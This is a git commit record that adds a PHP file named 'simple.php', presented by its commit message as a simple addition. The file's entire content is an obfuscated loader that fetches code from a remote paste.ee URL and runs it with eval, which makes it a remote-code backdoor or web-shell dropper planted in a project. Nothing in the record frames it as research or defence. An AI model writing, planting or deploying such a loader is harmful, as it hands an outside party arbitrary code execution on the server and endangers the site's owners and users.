b16a95b1558e3028ec2152a1983c570f2daadebe
onlyme1d <agungrikardo09@gmail.com>
2025-11-17 13:58:53 +0700

    Create simple.php

---
+++ simple.php
@@ -0,0 +1,9 @@
+<?php eval(
+    /_/ urldecode("%3f%3e") .
+        file_get_contents(
+            /_/ urldecode(
+                /_/ "https://paste.ee/r/uTPY5NJo/0"
+            )
+        )
+); 
+?>
